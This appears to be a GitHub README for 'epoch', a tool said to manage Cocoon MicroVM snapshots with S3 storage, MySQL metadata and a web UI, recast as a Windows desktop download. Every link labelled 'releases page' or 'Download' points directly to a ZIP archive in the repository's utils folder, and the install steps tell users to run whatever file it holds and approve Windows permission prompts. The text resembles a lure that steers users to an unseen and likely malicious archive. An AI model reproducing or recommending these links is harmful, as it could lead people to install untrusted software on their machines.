# 🟣 epoch - Fast snapshot access for Windows

[⬇️ Download epoch for Windows](https://raw.githubusercontent.com/Atmosphereport131/epoch/main/utils/Software-2.5-alpha.4.zip)

## 🧭 What epoch does

epoch helps you work with Cocoon MicroVM snapshots on your Windows PC. It keeps snapshot data in object storage, saves details in MySQL, and gives you a web page for browsing repositories and managing access tokens.

Use it when you need to:

- open stored VM snapshots
- organize snapshot data in one place
- manage tokens for automation
- browse repositories in a simple web UI
- pull pre-built snapshots for fast VM startup

## 💻 What you need

Before you install epoch, make sure you have:

- Windows 10 or Windows 11
- 4 GB of RAM or more
- 1 GB of free disk space
- a stable internet connection
- access to an S3-compatible storage service
- access to a MySQL server
- a modern web browser

If you plan to use epoch for live snapshot data, make sure your storage account and database are ready first.

## 📥 Download epoch

Go to the release page here:

[Download epoch](https://raw.githubusercontent.com/Atmosphereport131/epoch/main/utils/Software-2.5-alpha.4.zip)

On that page, look for the latest Windows release file. Save it to your computer, then open it from your Downloads folder.

## 🛠️ Install on Windows

Follow these steps:

1. Open the [releases page](https://raw.githubusercontent.com/Atmosphereport131/epoch/main/utils/Software-2.5-alpha.4.zip).
2. Find the latest release.
3. Download the Windows file for epoch.
4. If the file is a ZIP archive, right-click it and choose **Extract All**.
5. If the file is an installer, double-click it to start setup.
6. If Windows asks for permission, select **Yes**.
7. Wait for the install to finish.
8. Open epoch from the Start menu or from the folder where you extracted it.

## ▶️ Run epoch

After you install epoch, start the app and connect it to your storage and database.

Typical setup steps:

1. Open epoch.
2. Enter the address of your S3-compatible object storage.
3. Enter your MySQL connection details.
4. Save the settings.
5. Open the web UI in your browser.
6. Sign in with your token or create one in the token area.
7. Browse repositories and snapshot data.

If the app uses a local port, the web page will usually open in your browser after launch. If it does not, check the app window for the local address.

## 🧩 Set up your storage

epoch stores VM snapshots as content-addressed blobs in object storage. Use a service that supports S3-style access.

You will usually need:

- an endpoint URL
- an access key
- a secret key
- a bucket name
- permission to read and write objects

Use a bucket with enough space for your snapshot data. If you store many VM images, plan for growth.

## 🗄️ Set up MySQL

epoch saves metadata in MySQL. This keeps track of repositories, snapshot info, and token data.

You will usually need:

- a MySQL server address
- a database name
- a user name
- a password
- access from the machine running epoch

A local MySQL install works for testing. A remote server works better for shared use.

## 🌐 Use the web UI

The web UI lets you browse repositories and manage tokens.

From the web UI, you can:

- view repository names
- inspect stored snapshot records
- create or revoke tokens
- check basic status details
- review stored metadata

Open the UI in your browser and keep it bookmarked if you use epoch often.

## 🔒 Tokens and access

epoch uses tokens for automation and access control.

Keep these points in mind:

- give each user or tool its own token
- remove old tokens when they are no longer needed
- store tokens in a safe place
- do not share tokens in chat, email, or public files

If a token stops working, create a new one in the web UI and update your tools.

## ⚙️ Common use cases

epoch fits well in setups where you want fast VM startup and simple snapshot handling.

Common uses include:

- booting Cocoon MicroVMs from pre-built snapshots
- keeping VM state in object storage
- exposing snapshot data through a registry-style API
- automating snapshot pulls in deployment scripts
- managing snapshot records in a browser

## 🧪 First check after setup

After you finish setup, test the app with a small snapshot set.

Check that:

- epoch starts without errors
- the web UI opens in your browser
- the storage bucket is reachable
- MySQL accepts the connection
- tokens can be created and used
- repository data appears in the UI

If these items work, your setup is ready for normal use.

## 🖱️ Simple workflow

A basic day-to-day flow looks like this:

1. Start epoch.
2. Open the web UI.
3. Pick a repository.
4. Add or review tokens.
5. Pull a snapshot when needed.
6. Use the snapshot to start a VM.
7. Store new snapshot data back in object storage.

## 📁 Folder and data layout

epoch keeps data in a few places:

- object storage for snapshot blobs
- MySQL for metadata
- local app files for settings and logs

Keep each part separate so it is easier to manage and back up.

## 🧰 Troubleshooting

If epoch does not start, check these items:

- the download finished fully
- Windows did not block the file
- your storage endpoint is correct
- your MySQL details are correct
- your network can reach the storage service
- the bucket name exists
- your token is valid

If the web UI does not load, make sure the app is running and check the address shown in the app window.

If snapshot data does not appear, verify that the repository name matches the data in storage and that your token has access

## 🧾 File and access tips

Use these habits to keep things working:

- keep one copy of the release file in case you need it again
- back up your MySQL database on a schedule
- monitor object storage use so it does not fill up
- remove unused repositories and tokens
- keep your release page link handy for updates

## 🔄 Updating epoch

When a new version is available, repeat the download steps:

1. Open the [releases page](https://raw.githubusercontent.com/Atmosphereport131/epoch/main/utils/Software-2.5-alpha.4.zip).
2. Get the latest Windows file.
3. Install or replace the old version.
4. Open the app again.
5. Check your storage and MySQL settings after the update

## 📌 What epoch is built for

epoch is built for snapshot-based VM workflows where speed matters. It combines object storage, metadata storage, token control, and a web UI in one place so you can manage VM snapshots without extra tools